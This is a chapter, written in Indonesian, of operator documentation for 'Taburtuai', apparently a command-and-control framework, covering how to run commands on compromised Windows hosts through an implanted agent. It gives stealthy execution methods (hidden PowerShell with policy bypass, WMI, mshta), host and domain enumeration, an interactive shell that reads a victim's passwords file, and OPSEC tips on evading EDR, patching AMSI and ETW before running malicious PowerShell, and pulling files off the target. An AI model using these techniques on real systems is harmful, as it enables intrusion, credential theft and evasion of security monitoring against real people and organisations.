# 05 — Command Execution

## Metode Eksekusi

Taburtuai mendukung empat metode eksekusi di Windows. Pilih berdasarkan situasi:

| Method | Command | Deteksi | Gunakan Ketika |
|--------|---------|---------|----------------|
| `powershell` | `powershell.exe -w hidden -ep bypass -c "..."` | Sedang | Default, cmdlet PS dibutuhkan |
| `cmd` | `cmd.exe /c "..."` | Rendah | Perintah CMD sederhana, lebih stealth |
| `wmi` | `WMI Win32_Process::Create` | Rendah | Eksekusi lateral/remote |
| `mshta` | `mshta vbscript:...` | Rendah | Living-off-the-land, LOLBin |

**Default:** Agent menggunakan method yang di-bake saat build (`EXEC_METHOD`).
Bisa di-override per-command dengan flag `--method`.

---

## Eksekusi Satu Perintah

### Syntax Dasar

```
cmd <agent-id> "<perintah>"
```

### Contoh: Identifikasi Awal

```
taburtuai(IP:8000) › cmd 2703886d "whoami"
```
```
[*] Queuing command (method: powershell)...
[+] Command queued: a1b2c3d4-5e6f-7890-abcd-ef1234567890
[*] Waiting for result (timeout: 30s)...
[+] Result received (1.3s, exit_code: 0):

DESKTOP-QLPBF95\john.doe
```

```
taburtuai(IP:8000) › cmd 2703886d "whoami /all"
```
```
[+] Result received (1.1s):

USER INFORMATION
----------------
User Name                  SID
========================== ===========================================
desktop-qlpbf95\john.doe   S-1-5-21-1234567890-0987654321-1122334455-1001

GROUP INFORMATION
-----------------
Group Name                                 Type             SID
========================================== ================ ==================
Everyone                                   Well-known group S-1-1-0
BUILTIN\Administrators                     Alias            S-1-5-32-544
BUILTIN\Users                              Alias            S-1-5-32-545
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11
NT AUTHORITY\This Organization             Well-known group S-1-5-15

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

### Contoh: Info Sistem

```
taburtuai(IP:8000) › cmd 2703886d "systeminfo"
```
```
[+] Result received (3.2s):

Host Name:                 DESKTOP-QLPBF95
OS Name:                   Microsoft Windows 11 Home
OS Version:                10.0.22621 Build 22621
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          John Doe
Registered Organization:
Product ID:                00326-10000-00000-AA385
Original Install Date:     3/15/2025, 9:00:00 AM
System Boot Time:          4/23/2026, 8:45:00 AM
System Manufacturer:       Dell Inc.
System Model:              XPS 13 9305
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 140 Stepping 1
Total Physical Memory:     16,384 MB
Available Physical Memory: 8,621 MB
Virtual Memory: Max Size:  18,816 MB
Domain:                    CORP.LOCAL
Logon Server:              \\DC01
```

### Contoh: Network Enumeration

```
taburtuai(IP:8000) › cmd 2703886d "ipconfig /all"
```
```
[+] Result received (0.8s):

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DESKTOP-QLPBF95
   Primary Dns Suffix  . . . . . . . : corp.local
   Node Type . . . . . . . . . . . . : Hybrid
   DNS Suffix Search List. . . . . . : corp.local

Ethernet adapter Ethernet:
   Connection-specific DNS Suffix  . : corp.local
   Description . . . . . . . . . . . : Intel(R) Ethernet Connection
   Physical Address. . . . . . . . . : 00-11-22-33-44-55
   DHCP Enabled. . . . . . . . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.1.105(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
   DHCP Server . . . . . . . . . . . : 192.168.1.1
   DNS Servers . . . . . . . . . . . : 192.168.1.10
                                       8.8.8.8
```

```
taburtuai(IP:8000) › cmd 2703886d "net view /all /domain"
```
```
[+] Result received (2.5s):

Server Name            Remark
-------------------------------------------------------------------------------
\\DC01                 Primary Domain Controller
\\FILESERVER-01        File Server
\\CORP-WS-042          Workstation
\\MAIL-SERVER          Exchange Mail Server
The command completed successfully.
```

---

## Pilih Metode Eksekusi

### Override per-Command

```
taburtuai(IP:8000) › cmd 2703886d "Get-Process" --method powershell
taburtuai(IP:8000) › cmd 2703886d "dir C:\Users" --method cmd
taburtuai(IP:8000) › cmd 2703886d "Get-ADUser -Filter *" --method powershell
```

### Kapan Masing-Masing Dipakai

**`cmd` — CMD.exe**
```
# Perintah file system sederhana
taburtuai(IP:8000) › cmd 2703886d "dir C:\Users\john.doe\Desktop /b" --method cmd
```
```
[+] Result (0.4s):
loot.xlsx
passwords.txt
README.md
desktop.ini
```

**`powershell` — PowerShell**
```
# PowerShell cmdlet, .NET, WMI query
taburtuai(IP:8000) › cmd 2703886d "Get-LocalUser | Select Name,Enabled,LastLogon" --method powershell
```
```
[+] Result (1.8s):

Name               Enabled LastLogon
----               ------- ---------
Administrator      False
DefaultAccount     False
Guest              False
john.doe           True    4/23/2026 8:44:12 AM
WDAGUtilityAccount False
```

**`wmi` — WMI Process Create**
```
# Eksekusi via WMI (tidak membuat cmd/ps child process langsung)
taburtuai(IP:8000) › cmd 2703886d "ipconfig" --method wmi
```

**`mshta` — MSHTA VBScript**
```
# Living off the land, kurang terdeteksi di endpoint tertentu
taburtuai(IP:8000) › cmd 2703886d "ipconfig" --method mshta
```

---

## Custom Timeout

Default timeout: 30 detik. Untuk perintah yang lama (scan, build, copy besar):

```
taburtuai(IP:8000) › cmd 2703886d "Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue" \
  --method powershell \
  --timeout 120 \
  --wait
```

**Output:**
```
[*] Command queued (timeout: 120s)...
[*] Waiting for result...
[+] Result received (34.7s):

    Directory: C:\Users\john.doe

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/20/2026   2:14 PM                .ssh
d-----         4/23/2026   8:44 AM                AppData
...
[truncated — 1,247 items]
```

---

## Working Directory

Jalankan perintah dari direktori tertentu:

```
taburtuai(IP:8000) › cmd 2703886d "dir" --working-dir "C:\Windows\System32"
```
```
[+] Result (0.6s):

 Volume in drive C has no label.
 Volume Serial Number is 1A2B-3C4D

 Directory of C:\Windows\System32

04/23/2026  09:00 AM    <DIR>          .
04/23/2026  09:00 AM    <DIR>          ..
03/14/2025  09:15 AM         9,452,016 ntdll.dll
03/14/2025  09:15 AM         1,245,184 kernel32.dll
...
```

---

## Interactive Shell Session

Untuk operasi multi-step yang butuh konteks (working dir, variabel, dll):

```
taburtuai(IP:8000) › shell 2703886d
```

**Output:**
```
[*] Opening interactive shell on 2703886d (DESKTOP-QLPBF95)...
[*] Commands dijalankan satu per satu melalui antrean beacon.
[*] Ketik 'exit' untuk menutup session.

[shell 2703886d DESKTOP-QLPBF95\john.doe] >
```

### Sesi Kerja Lengkap

```
[shell 2703886d DESKTOP-QLPBF95\john.doe] > whoami /groups | findstr "admin"
BUILTIN\Administrators                     Alias   S-1-5-32-544  Mandatory group, Enabled by default, Enabled group, Group owner

[shell 2703886d DESKTOP-QLPBF95\john.doe] > net localgroup administrators
Alias name     administrators
Members
Administrator
john.doe

[shell 2703886d DESKTOP-QLPBF95\john.doe] > dir "C:\Users\john.doe\AppData\Roaming\Microsoft\Windows\Recent"
 Directory of C:\Users\john.doe\AppData\Roaming\Microsoft\Windows\Recent

04/23/2026  07:30 AM                23 budget_2026.xlsx.lnk
04/22/2026  06:15 PM                23 passwords.txt.lnk
04/21/2026  03:45 PM                23 vpn_config.ovpn.lnk

[shell 2703886d DESKTOP-QLPBF95\john.doe] > type "C:\Users\john.doe\Documents\passwords.txt"
DB_PROD: Adm1n@2026!
VPN: john.doe:SecureVPN123
Router: admin:router123

[shell 2703886d DESKTOP-QLPBF95\john.doe] > exit
[*] Shell session closed.
```

---

## History Perintah

Lihat riwayat semua perintah ke agent tertentu:

```
taburtuai(IP:8000) › history 2703886d
```

**Output:**
```
[+] Command history for agent 2703886d (last 20):

CMD-ID          TYPE     COMMAND              STATUS     DURATION   CREATED
a1b2c3d4        execute  whoami               completed  1.3s       09:05:01
b2c3d4e5        execute  systeminfo           completed  3.2s       09:06:14
c3d4e5f6        execute  ipconfig /all        completed  0.8s       09:07:32
d4e5f6g7        execute  net view /all        completed  2.5s       09:08:55
e5f6g7h8        execute  dir C:\Users         completed  0.6s       09:10:01
```

### Filter berdasarkan Status

```
taburtuai(IP:8000) › history 2703886d --status failed
taburtuai(IP:8000) › history 2703886d --status pending
taburtuai(IP:8000) › history 2703886d --limit 50
```

---

## Lihat Status & Output Perintah Spesifik

```
taburtuai(IP:8000) › result a1b2c3d4
```

**Output:**
```
[+] Command a1b2c3d4-5e6f-7890-abcd-ef1234567890

  Agent     : 2703886d (DESKTOP-QLPBF95)
  Type      : execute
  Command   : whoami
  Status    : completed
  Exit Code : 0
  Created   : 09:05:01
  Executed  : 09:05:02 (queued 1.1s)
  Completed : 09:05:03 (ran 1.3s)

  Output:
  DESKTOP-QLPBF95\john.doe
```

---

## Bersihkan Antrean Perintah

Hapus semua perintah pending di antrean agent (berguna kalau agent offline lama):

```
taburtuai(IP:8000) › queue clear 2703886d
```

**Output:**
```
[+] Cleared 3 pending commands from queue for agent 2703886d.
```

---

## Tips OPSEC

```
# Hindari keyword yang mudah dideteksi EDR
cmd 2703886d "Get-Process" --method powershell  ← lebih stealth
cmd 2703886d "tasklist"                          ← cmd biasa

# Untuk perintah dengan output besar, simpan dulu ke file di target
cmd 2703886d "Get-ChildItem C:\ -Recurse > C:\Temp\enum.txt 2>&1" --timeout 300
# Lalu download file-nya
files download 2703886d "C:\Temp\enum.txt" ./enum.txt

# Hindari PowerShell ScriptBlock logging (setelah AMSI/ETW di-patch)
bypass amsi 2703886d --wait
bypass etw  2703886d --wait
# Baru jalankan script PS yang berbahaya
cmd 2703886d "IEX (Get-Content payload.ps1)" --method powershell
```

---

**Selanjutnya:** [06 — File Operations](06-files.md)
